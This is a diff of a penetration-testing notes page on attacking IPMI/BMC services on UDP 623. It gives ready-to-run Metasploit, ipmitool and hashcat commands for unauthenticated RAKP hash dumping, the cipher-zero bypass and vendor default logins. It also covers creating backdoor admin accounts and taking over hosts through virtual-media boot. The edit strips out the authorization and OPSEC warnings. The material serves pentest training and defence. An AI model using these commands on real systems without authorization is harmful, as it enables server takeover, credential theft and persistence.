@@ -1,6 +1,25 @@
 ---
 title: IPMI - Port 623 (UDP)
 description: Enumeration and attack methodology for IPMI/BMC services on UDP 623, including the RAKP hash dump, cipher zero auth bypass, vendor default credentials, and hash cracking.
+openGraph:
+  title: "IPMI - Port 623 (UDP)"
+  description: "Enumeration and attack methodology for IPMI/BMC services on UDP 623, including the RAKP hash dump, cipher zero auth bypass, vendor default credentials, and hash cracking."
+  images:
+    - url: /imgs/ipmi.jpg
+      width: 1672
+      height: 941
+      alt: IPMI - Port 623 (UDP)
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "IPMI - Port 623 (UDP)"
+  description: "Enumeration and attack methodology for IPMI/BMC services on UDP 623, including the RAKP hash dump, cipher zero auth bypass, vendor default credentials, and hash cracking."
+  images:
+    - url: /imgs/ipmi.jpg
+      width: 1672
+      height: 941
+      alt: IPMI - Port 623 (UDP)
+      type: image/jpeg
 ---
 
 # IPMI - Port 623 (UDP)
@@ -8,7 +27,7 @@ description: Enumeration and attack methodology for IPMI/BMC services on UDP 623
 import { Callout } from 'nextra/components'
 
 
-UDP/623 is one of the highest-value findings on any network. The IPMI 2.0 RAKP protocol has a specification flaw that lets you extract HMAC-SHA1 password hashes for any valid user with no authentication — there is no patch and never will be. Combined with vendor default credentials and the cipher-zero bypass, BMCs are routinely the fastest path from "scan complete" to physical-equivalent control of every server in the rack.
+UDP/623 is Intelligent Platform Management Interface (IPMI) one of the highest-value findings on any network. The IPMI 2.0 RAKP protocol has a specification flaw that lets you extract HMAC-SHA1 password hashes for any valid user with no authentication, there is no patch and never will be. Combined with vendor default credentials and the cipher-zero bypass, BMCs are routinely the fastest path from "scan complete" to physical-equivalent control of every server in the rack.
 
 ## Cheatsheet
 
@@ -30,11 +49,9 @@ ipmitool -I lanplus -C 0 -H <IP> -U <USER> -P <PASS> user list
 hashcat -m 7300 ipmi.txt <WORDLIST>
 hashcat -m 7300 ipmi.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u    # HP iLO default mask (8 char [A-Z0-9])
-john --format=rakp --wordlist=<WORDLIST> ipmi.txt         # CPU fallback
+john --format=rakp --wordlist=<WORDLIST> ipmi.txt         
 
-# Vendor default credentials (try first, before cracking)
-ipmitool -I lanplus -H <IP> -U root -P calvin user list        # Dell iDRAC
-ipmitool -I lanplus -H <IP> -U ADMIN -P ADMIN user list        # Supermicro
+# Vendor default credentials checkout https://github.com/netbiosX/Default-Credentials/blob/master/IPMI-Default-Password-List.mdown
 
 # Authenticated BMC operations (lanplus = IPMI 2.0)
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user list      # Enumerate accounts
@@ -42,32 +59,27 @@ ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> lan print      # IP, MAC, gatewa
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> sel list       # System event log
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis status # Power state
 
-# Backdoor admin user (persistence — authorized engagements only)
+# Backdoor admin user (persistence)
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user set name 4 backdoor
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user set password 4 <PASS>
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user priv 4 4
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user enable 4
 ```
 
-<Callout type="warning">
-**OPSEC:** Every BMC probe is logged by the BMC and forwarded to syslog/SIEM in mature environments. `chassis power reset` is extraordinarily noisy — it triggers monitoring alerts, paging, and incident response. Never power-cycle outside an authorized, scheduled window. Prefer the silent path: dump hashes, crack, and reuse credentials.
-</Callout>
-
 ## Methodology
 
 <Callout type="important">
-Follow this checklist whenever UDP/623 is open or suspected. BMC compromise is functionally equivalent to physical access — boot from an attacker ISO, mount disks offline, reset the local admin password, persist below the OS. The RAKP hash dump is unauthenticated and has no fix; run it first. Spray every cracked password against the host OS and every other BMC in scope.
+Follow this checklist whenever UDP/623 is open or suspected. BMC compromise is functionally equivalent to physical access, boot from an attacker ISO, mount disks offline, reset the local admin password, persist below the OS. The RAKP hash dump is unauthenticated and has no fix; run it first. Spray every cracked password against the host OS and every other BMC in scope.
 </Callout>
 
 ### Phase 1: Detect and Fingerprint
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - Is IPMI 2.0 (RAKP-vulnerable) or only legacy 1.5 in play, and which cipher suites are accepted?
   - What is the OEM vendor (Dell, HP, Supermicro, IBM, Cisco), and which defaults and password format does that imply?
-  - Are there companion management surfaces — web GUI on 80/443, SMASH-CLP on 22/23 — that give more than IPMI-over-UDP?
-  - Do I even need the noisy UDP scan, or can the hash dump itself confirm the service?
+  - Are there companion management surfaces, web GUI on 80/443, SMASH-CLP on 22/23 that give more than IPMI-over-UDP?
 </Callout>
 
 ```bash
@@ -78,21 +90,16 @@ nmap -sU -sV -p623 <IP>
 msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <IP>; run"
 ```
 
-- [ ] `nmap -sU --script ipmi-version -p623 <IP>` — confirms IPMI is live and fingerprints the version (1.5 vs 2.0), supported cipher suites, available auth types, and the OEM vendor ID (which usually identifies the hardware).
-- [ ] Check ports 80/443 on the same host — most BMCs expose a web console (iLO, iDRAC, Supermicro IPMI Web) with virtual console and ISO mounting that IPMI-over-UDP lacks.
-- [ ] Check for SSH (22) and Telnet (23) on the same IP — many BMCs expose SMASH-CLP or a vendor CLI there.
-- [ ] Note the OEM vendor — it dictates which default credentials to try (Phase 2) and the likely password format for the RAKP mask attack (Phase 5).
+- [ ] `nmap -sU --script ipmi-version -p623 <IP>`: confirms IPMI is live and fingerprints the version (1.5 vs 2.0), supported cipher suites, available auth types, and the OEM vendor ID (which usually identifies the hardware).
+- [ ] Check ports 80/443 on the same host, most BMCs expose a web console (iLO, iDRAC, Supermicro IPMI Web) with virtual console and ISO mounting that IPMI-over-UDP lacks.
+- [ ] Check for SSH (22) and Telnet (23) on the same IP many BMCs expose SMASH-CLP or a vendor CLI there.
+- [ ] Note the OEM vendor it dictates which default credentials to try (Phase 2) and the likely password format for the RAKP mask attack (Phase 5).
 
-<Callout type="warning">
-**OPSEC:** If you only need to confirm IPMI exists, skip the slow nmap UDP scan and go straight to `ipmi_dumphashes` — a successful hash dump itself confirms IPMI 2.0 is running, and you get loot in the same step.
-</Callout>
-
-**Move to Phase 2** once the version and vendor are known. If it is IPMI 2.0, you can run Phase 2 (defaults) and Phase 3 (hash dump) in parallel — both are cheap.
 
 ### Phase 2: Default Credentials
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - Which vendor defaults match the OEM identified in Phase 1?
   - Has this BMC ever been re-provisioned, or is it management-plane gear configured once and forgotten?
@@ -109,18 +116,16 @@ ipmitool -I lanplus -H <IP> -U admin -P password user list     # Cisco CIMC
 ipmitool -I lanplus -H <IP> -U root -P changeme user list      # Oracle ILOM
 ```
 
-- [ ] Try vendor defaults first — they work alarmingly often on hardware deployed years ago and never re-provisioned.
-- [ ] Dell iDRAC `root:calvin`, Supermicro `ADMIN:ADMIN`, IBM/Lenovo `USERID:PASSW0RD`, Cisco CIMC `admin:password`, Oracle ILOM `root:changeme`, Fujitsu iRMC `admin:admin`.
-- [ ] HP iLO uses `Administrator:<8-char random>` from the chassis sticker — if you cannot read the sticker, mask-attack the RAKP hash (Phase 5) instead.
-- [ ] Try the same defaults against the web interface (443) — some BMCs lock IPMI-over-LAN but leave the web GUI on defaults.
-- [ ] If a default works, immediately spray that username/password against the host OS — admins frequently sync BMC and root/Administrator credentials.
-
-**Move to Phase 3** regardless of whether defaults worked — the unauthenticated hash dump is always worth running and may reveal accounts the defaults missed.
+- [ ] Try vendor defaults first they work alarmingly often on hardware deployed years ago and never re-provisioned.
+- [ ] [Vendor default credentials](https://github.com/netbiosX/Default-Credentials/blob/master/IPMI-Default-Password-List.mdown)
+- [ ] HP iLO uses `Administrator:<8-char random>` from the chassis sticker if you cannot read the sticker, mask-attack the RAKP hash (Phase 5) instead.
+- [ ] Try the same defaults against the web interface (443) some BMCs lock IPMI-over-LAN but leave the web GUI on defaults.
+- [ ] If a default works, immediately spray that username/password against the host OS admins frequently sync BMC and root/Administrator credentials.
 
 ### Phase 3: RAKP Hash Dump (IPMI 2.0 — CVE-2013-4786)
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - Does the BMC speak IPMI 2.0 (the only version with the RAKP flaw)?
   - Which usernames exist on the BMC, and what naming convention do they reveal?
@@ -129,30 +134,28 @@ ipmitool -I lanplus -H <IP> -U root -P changeme user list      # Oracle ILOM
 </Callout>
 
 ```bash
-# Dump a salted HMAC-SHA1 hash for every valid BMC user — no creds needed
+# Dump a salted HMAC-SHA1 hash for every valid BMC user
 msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; set OUTPUT_HASHCAT_FILE ipmi.txt; run"
 # Same against an entire subnet of BMCs in one run
 msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <SUBNET>/24; set OUTPUT_HASHCAT_FILE ipmi.txt; run"
 ```
 
-- [ ] `ipmi_dumphashes` with `OUTPUT_HASHCAT_FILE` — the single highest-value action against IPMI. Returns a salted HMAC-SHA1 hash for every valid user, with no credentials required.
-- [ ] Run it against the whole subnet (`set RHOSTS <SUBNET>/24`) if you found multiple BMCs — one run can produce dozens of hashes that may share a common admin password.
-- [ ] Note every username returned even if uncrackable — usernames are intelligence (naming conventions, likely OS accounts).
+- [ ] `ipmi_dumphashes` with `OUTPUT_HASHCAT_FILE` the single highest-value action against IPMI. Returns a salted HMAC-SHA1 hash for every valid user, with no credentials required.
+- [ ] Run it against the whole subnet (`set RHOSTS <SUBNET>/24`) if you found multiple BMCs one run can produce dozens of hashes that may share a common admin password.
+- [ ] Note every username returned even if uncrackable usernames are intelligence (naming conventions, likely OS accounts).
 - [ ] Output is hashcat mode 7300 format (`<user>:$rakp$<salt>$<hash>`). Start cracking (Phase 5) while you continue enumerating.
 
 <Callout type="default" emoji="?">
-  **Why is the RAKP flaw uniquely devastating?** It is a protocol-specification flaw, not an implementation bug. The IPMI 2.0 spec mandates that in RAKP message 2 the BMC sends a salted HMAC-SHA1 of the user's password to the client *before* the client proves it knows that password. Every spec-compliant BMC is "vulnerable" and there is no patch — fixing it would break IPMI 2.0. The only mitigations are strong passwords, segmenting BMCs onto a dedicated management VLAN, and disabling IPMI-over-LAN in favor of Redfish/HTTPS.
+  **Why is the RAKP flaw uniquely devastating?** It is a protocol-specification flaw, not an implementation bug. The IPMI 2.0 spec mandates that in RAKP message 2 the BMC sends a salted HMAC-SHA1 of the user's password to the client *before* the client proves it knows that password. Every spec-compliant BMC is "vulnerable" and there is no patch fixing it would break IPMI 2.0. The only mitigations are strong passwords, segmenting BMCs onto a dedicated management VLAN, and disabling IPMI-over-LAN in favor of Redfish/HTTPS.
 </Callout>
-
-**Move to Phase 4** in parallel — cipher zero may grant authenticated access instantly, making cracking unnecessary.
 
 ### Phase 4: Cipher Zero Auth Bypass
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - Does this BMC accept cipher suite 0 (a common factory-default misconfiguration)?
-  - Which username should I pair it with — and do I have a username list from the Phase 3 dump?
+  - Which username should I pair it with and do I have a username list from the Phase 3 dump?
   - If cipher zero works, can I skip cracking entirely and go straight to BMC operations?
   - Will every subsequent command need the `-C 0` flag to stay on the bypass session?
 </Callout>
@@ -164,17 +167,15 @@ msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS <IP>; 
 ipmitool -I lanplus -C 0 -H <IP> -U Administrator -P <PASS> user list
 ```
 
-- [ ] `ipmi_cipher_zero` module — confirms whether the BMC accepts cipher suite 0 (no auth, no integrity, no confidentiality).
-- [ ] `ipmitool -I lanplus -C 0 -H <IP> -U <USER> -P <PASS> user list` — if cipher 0 is enabled, any password is accepted as long as the username exists. Pair `-C 0` with a real username from the Phase 3 dump.
-- [ ] If cipher zero works, you have full BMC access without cracking a single hash — proceed straight to Phase 6.
+- [ ] `ipmi_cipher_zero` module confirms whether the BMC accepts cipher suite 0 (no auth, no integrity, no confidentiality).
+- [ ] `ipmitool -I lanplus -C 0 -H <IP> -U <USER> -P <PASS> user list`if cipher 0 is enabled, any password is accepted as long as the username exists. Pair `-C 0` with a real username from the Phase 3 dump.
+- [ ] If cipher zero works, you have full BMC access without cracking a single hash proceed straight to Phase 6.
 - [ ] Keep the `-C 0` flag on every subsequent `ipmitool` command to stay on the bypass session.
-
-**Move to Phase 5** if cipher zero is not accepted — you will need to crack the dumped hashes for valid credentials. If it is accepted, skip to Phase 6.
 
 ### Phase 5: Hash Cracking
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - Is the target an HP iLO, where the 8-char `[A-Z0-9]` default keyspace is fully exhaustible?
   - Will a plain dictionary suffice, or do I need rules/masks for this vendor's password policy?
@@ -183,7 +184,7 @@ ipmitool -I lanplus -C 0 -H <IP> -U Administrator -P <PASS> user list
 </Callout>
 
 ```bash
-# Baseline dictionary (RAKP HMAC-SHA1 cracks at multi-GH/s — fast)
+# Baseline dictionary (RAKP HMAC-SHA1 cracks at multi-GH/s fast)
 hashcat -m 7300 ipmi.txt <WORDLIST>
 # Dictionary + rules for higher coverage
 hashcat -m 7300 ipmi.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
@@ -193,18 +194,18 @@ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 john --format=rakp --wordlist=<WORDLIST> ipmi.txt
 ```
 
-- [ ] `hashcat -m 7300 ipmi.txt <WORDLIST>` — start with `rockyou`. RAKP cracks at multiple GH/s, so dictionary + best64 finishes in seconds.
+- [ ] `hashcat -m 7300 ipmi.txt <WORDLIST>` start with `rockyou`. RAKP cracks at multiple GH/s, so dictionary + best64 finishes in seconds.
 - [ ] HP iLO targets: mask attack `-a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`. HP's factory default is exactly 8 chars from `[A-Z0-9]`; the ~2.8-trillion keyspace is exhaustible in hours on one GPU.
 - [ ] If dictionary fails: add `best64.rule`, then `OneRuleToRuleThemAll.rule` for broader coverage.
 - [ ] `john --format=rakp` is the CPU-only fallback when no GPU is available.
-- [ ] The instant a hash cracks, spray the cleartext against every OS service on every host in scope — BMC and host admin passwords are routinely identical.
+- [ ] The instant a hash cracks, spray the cleartext against every OS service on every host in scope BMC and host admin passwords are routinely identical.
 
 **Move to Phase 6** as soon as any credential is recovered (cracked, default, or cipher-zero).
 
 ### Phase 6: BMC Exploitation (With Valid Credentials)
 
 <Callout type="default" emoji="?">
-  **Questions to ask**
+  **ask yourself**
 
   - What does `lan print` reveal about the management VLAN and adjacent BMCs?
   - Is the web GUI (virtual console + virtual media) reachable, enabling offline disk access?
@@ -215,7 +216,7 @@ john --format=rakp --wordlist=<WORDLIST> ipmi.txt
 ```bash
 # Enumerate accounts and privilege levels (4 = Administrator)
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user list
-# Dump BMC network config — IP, MAC, gateway, VLAN tag
+# Dump BMC network config IP, MAC, gateway, VLAN tag
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> lan print
 # Boot history / hardware events
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> sel list
@@ -224,48 +225,12 @@ ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis bootdev cdrom options=ef
 ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis power reset
 ```
 
-- [ ] `user list` — enumerate every BMC account including disabled ones; note privilege levels (4 = Administrator).
-- [ ] `lan print` — dumps IP, MAC, gateway, default route, and **VLAN tag**. The VLAN ID frequently identifies an isolated management network full of other BMCs and jump hosts (feeds Phase 7).
-- [ ] `sel list` — boot history, power events, and hardware faults; boot strings often leak the host OS/bootloader for fingerprinting.
+- [ ] `user list` enumerate every BMC account including disabled ones; note privilege levels (4 = Administrator).
+- [ ] `lan print` dumps IP, MAC, gateway, default route, and **VLAN tag**. The VLAN ID frequently identifies an isolated management network full of other BMCs and jump hosts (feeds Phase 7).
+- [ ] `sel list` boot history, power events, and hardware faults; boot strings often leak the host OS/bootloader for fingerprinting.
 - [ ] Access the web GUI (443) with the same credentials for **virtual console** (KVM-over-IP) and **virtual media** (mount an attacker ISO).
-- [ ] **Virtual media + boot order = root:** mount a Kali live ISO, set next boot to virtual CD, hard-reset, boot your own OS with full disk access. Mount the host filesystems, dump SAM/SYSTEM or `/etc/shadow`, edit sudoers, drop SSH keys — OS-level admin without ever exploiting the host.
+- [ ] **Virtual media + boot order = root:** mount a Kali live ISO, set next boot to virtual CD, hard-reset, boot your own OS with full disk access. Mount the host filesystems, dump SAM/SYSTEM or `/etc/shadow`, edit sudoers, drop SSH keys OS-level admin without ever exploiting the host.
 - [ ] For persistence (if in scope): create a backdoor user in a free slot (`user set name/password`, `user priv 4`, `user enable`).
-
-<Callout type="warning">
-**OPSEC:** Power-cycling a production server triggers monitoring alerts, paging, and IR. **Never** issue `chassis power reset` outside an authorized, scheduled window, and get explicit written authorization for the exact host and timing. Virtual media mounts are quieter but still appear in the BMC system event log and vendor management platforms (Dell OpenManage, HP OneView).
-</Callout>
-
-**Move to Phase 7** to convert this single BMC compromise into fleet-wide and host-OS access.
-
-### Phase 7: Credential Reuse and Lateral Movement
-
-<Callout type="default" emoji="?">
-  **Questions to ask**
-
-  - Does the BMC admin password also unlock the host OS (the most common chaining path)?
-  - How many more BMCs sit on the management VLAN, and do they share this password?
-  - Is the BMC account AD-integrated — i.e. is it also a domain user worth spraying at the DC?
-  - What secondary secrets (SNMP, SMTP, LDAP binds) can I pillage from the BMC config?
-</Callout>
-
-```bash
-# Spray the cracked BMC password against the host OS
-nxc ssh <IP> -u <USER> -p <PASS>
-nxc smb <IP> -u <USER> -p <PASS>
-# Sweep the management VLAN for more BMCs
-nmap -sU -p623 --script ipmi-version <MGMT_VLAN>/24
-# If AD-integrated, spray the BMC user at the domain controller
-nxc smb <DC> -u <USER> -p <PASS>
-```
-
-- [ ] Spray every cracked BMC password against the host's OS services — [SSH](/01-Recon-and-Enumeration/Service-Enum/SSH-22), [SMB](/01-Recon-and-Enumeration/Service-Enum/SMB-137,138,139-445(samba)), [WinRM](/01-Recon-and-Enumeration/Service-Enum/WINRM-5985,5986), [RDP](/01-Recon-and-Enumeration/Service-Enum/RDP-3389). BMC/OS password reuse is the most common reason BMC compromise chains into full host takeover.
-- [ ] Sweep the management VLAN from `lan print` for more BMCs — one cracked password often unlocks every BMC in the rack (same provisioning script).
-- [ ] If the BMC is AD-joined (some iLO/iDRAC deployments), the account may be a domain user — spray it at the DC.
-- [ ] Pillage the BMC for secondary secrets: SNMP communities, SMTP relay creds (hardware alerts), and LDAP bind credentials.
-
-<Callout type="warning">
-**Recovery (methodology exhausted):** if no hash cracks and cipher zero is disabled, re-confirm the BMC is IPMI 2.0 (the dump only works there), widen cracking with larger wordlists and rules, mask-attack vendor default formats, and re-check the web GUI (443) and SSH/Telnet for defaults the IPMI-over-LAN path rejected. Re-rank: defaults and cipher zero (free) before cracking, cracking before destructive virtual-media boots.
-</Callout>
 
 <Quiz
   question="You cracked an HP iLO RAKP hash for user Administrator and the password is 8X3KQRP2. The host (10.10.5.20) also exposes SSH/22, HTTPS/443 (iLO web), and SMB/445. What is your highest-priority next move?"
@@ -276,7 +241,7 @@ nxc smb <DC> -u <USER> -p <PASS>
     "Run ipmi_dumphashes against the rest of the /24 to find more BMCs"
   ]}
   answer={2}
-  explanation="Credential reuse is silent, instant, and risk-free — check it before anything destructive or noisy. HP iLO admins routinely set the same password on the host OS, and HP's randomized iLO defaults are often kept across the whole fleet during provisioning, so the same string may unlock dozens of hosts. Power-cycling is destructive and an OPSEC disaster. Mounting virtual media is the right eventual play if reuse fails, but it writes BMC event-log entries and requires a reboot — much louder than just trying SSH. Sweeping for more BMCs is good but lower priority than confirming whether you already own this host's OS."
+  explanation="Credential reuse is silent, instant, and risk-free check it before anything destructive or noisy. HP iLO admins routinely set the same password on the host OS, and HP's randomized iLO defaults are often kept across the whole fleet during provisioning, so the same string may unlock dozens of hosts. Power-cycling is destructive and an OPSEC disaster. Mounting virtual media is the right eventual play if reuse fails, but it writes BMC event-log entries and requires a reboot much louder than just trying SSH. Sweeping for more BMCs is good but lower priority than confirming whether you already own this host's OS."
 />
 
 ## Overview
@@ -297,7 +262,7 @@ That independence is why it is such a rich target. Compromising a BMC means cont
 **Capabilities granted by BMC access:** power on/off/reset/cycle; full KVM-over-IP virtual console; mount virtual ISO/USB media; modify BIOS/UEFI settings and boot order; read hardware sensors; view/clear the system event log; firmware changes (some vendors); direct memory access via DCMI on supported hardware.
 
 <Callout type="important">
-BMC compromise is functionally equivalent to physical access to the server. An attacker with BMC admin can boot from an attacker ISO, mount the disks offline, reset the local Administrator password, install rootkits, and persist firmware-level implants — all without touching the host OS or triggering host-based detection. Treat every cracked BMC credential as a "physical break-in" finding in the report.
+BMC compromise is functionally equivalent to physical access to the server. An attacker with BMC admin can boot from an attacker ISO, mount the disks offline, reset the local Administrator password, install rootkits, and persist firmware-level implants all without touching the host OS or triggering host-based detection. Treat every cracked BMC credential as a "physical break-in" finding in the report.
 </Callout>
 
 ## RAKP Vulnerability Deep Dive
@@ -323,10 +288,10 @@ There is **no fix** for this. It is part of the IPMI 2.0 specification and canno
 
 ## Cipher Zero Authentication Bypass
 
-IPMI 2.0 negotiates a cipher suite at session establishment. **Cipher suite 0** is a special spec value meaning "no authentication, no integrity, no confidentiality." Many BMC vendors shipped factory-default configurations that accepted cipher 0 — so a client requesting it could authenticate as any existing user with any password.
+IPMI 2.0 negotiates a cipher suite at session establishment. **Cipher suite 0** is a special spec value meaning "no authentication, no integrity, no confidentiality." Many BMC vendors shipped factory-default configurations that accepted cipher 0 so a client requesting it could authenticate as any existing user with any password.
 
 ```bash
-# Test for cipher zero acceptance — if it returns the user list, full access without cracking
+# Test for cipher zero acceptance if it returns the user list, full access without cracking
 ipmitool -I lanplus -C 0 -H <IP> -U Administrator -P <PASS> user list
 ```
 
@@ -346,7 +311,7 @@ The fix requires explicitly disabling cipher 0 in BMC configuration, which many 
 | Hitachi BMC | `root` | `cmb9.user` | Hitachi blade servers |
 
 <Callout type="default">
-HP iLO factory-default passwords are randomized 8-character strings from `[A-Z0-9]`. The keyspace is `36^8 ≈ 2.8 × 10^12` — exhaustible on a single modern GPU in well under a day for RAKP HMAC-SHA1. Mask attack: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`. If the host has not been re-provisioned since deployment, you crack the iLO password by force.
+HP iLO factory-default passwords are randomized 8-character strings from `[A-Z0-9]`. The keyspace is `36^8 ≈ 2.8 × 10^12` exhaustible on a single modern GPU in well under a day for RAKP HMAC-SHA1. Mask attack: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`. If the host has not been re-provisioned since deployment, you crack the iLO password by force.
 </Callout>
 
 ## BMC Web Interfaces
@@ -408,41 +373,6 @@ ipmitool ... sensor list                   # All sensor readings
 ipmitool ... sdr list                      # Sensor data repository
 ipmitool ... fru print                     # Model, serial, manufacturer
 ```
-
-## Common Mistakes
-
-<Callout type="error">
-  - **Only scanning TCP** — IPMI is UDP/623. A default TCP scan misses it entirely. Always `-sU`.
-  - **Skipping the hash dump because you lack credentials** — `ipmi_dumphashes` needs none; it is the whole point of the RAKP flaw. Run it first.
-  - **Forgetting cipher zero** — it grants full access with any password and no cracking. Test it before burning GPU time.
-  - **Not reusing cracked passwords on the host OS** — BMC and host admin passwords are routinely identical; spray immediately.
-  - **Power-cycling without authorization** — `chassis power reset` triggers IR and can take down production. Never outside a written, scheduled window.
-  - **Ignoring the web GUI and management VLAN** — the 443 console (virtual media) and the VLAN from `lan print` are where single-BMC access becomes fleet-wide and host-OS compromise.
-</Callout>
-
-## Attack Chains / Related Notes
-
-| IPMI Finding | Next Step |
-|--------------|-----------|
-| UDP/623 open | Run `ipmi_dumphashes` immediately — no auth required |
-| Cipher zero accepted | Authenticate with any password using `-C 0` — full BMC access |
-| RAKP hash cracked | Spray cleartext against the host OS (SSH/SMB/WinRM/RDP) and every other BMC |
-| Vendor default works | Enumerate users, access web interface, attempt cred reuse on host |
-| BMC admin access | Mount Kali ISO via virtual media, reboot, dump host disks offline |
-| `lan print` reveals VLAN | Sweep that VLAN for more BMCs and jump hosts |
-| Multiple BMCs found | Cross-spray every cracked password against every BMC in the fleet |
-| BMC AD-integrated | The BMC user is also a domain user — spray against the DC |
-
-<Callout type="default" emoji="?">
-  **The BMC web interface is on the same IP as a host you already have a low-priv shell on. Why does this matter?** BMCs often listen on the host's primary NIC via sideband access, so the BMC and host OS share an IP. From your low-priv shell you can reach the BMC at `127.0.0.1:443` even if its external interface is firewalled off the rest of the network. This bypasses network ACLs meant to isolate the management plane and gives a path from low-priv host shell to BMC admin (and from there to root via virtual media). Always check for an IPMI web interface bound to localhost from inside any compromised host.
-</Callout>
-
-- **Came from:** [Nmap scanning / port discovery](/01-Recon-and-Enumeration), [SNMP-161,162](/01-Recon-and-Enumeration/Service-Enum/SNMP-161,162) (BMC management VLAN / community discovery)
-- **Leads to:** [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22), [SMB](/01-Recon-and-Enumeration/Service-Enum/SMB-137,138,139-445(samba)), [WinRM](/01-Recon-and-Enumeration/Service-Enum/WINRM-5985,5986), [RDP](/01-Recon-and-Enumeration/Service-Enum/RDP-3389), [File-Transfers](/04-Post-Exploitation/File-Transfers)
-
 <div className="flex flex-wrap gap-2 mb-4">
-  <TagPill color="#ef4444">#Penetration Testing</TagPill>
-  <TagPill color="#f97316">#Red Team</TagPill>
-  <TagPill color="#22c55e">#Certification</TagPill>
-  <TagPill color="#fcc629">#Linux</TagPill>
+  #PenetrationTesting #RedTeam #Certification #Linux #IPMI #BMC #RAKP #Hashcat #Metasploit #ServiceEnum #CVE #iDRAC #iLO #Supermicro #Hardware #HashCracking
 </div>
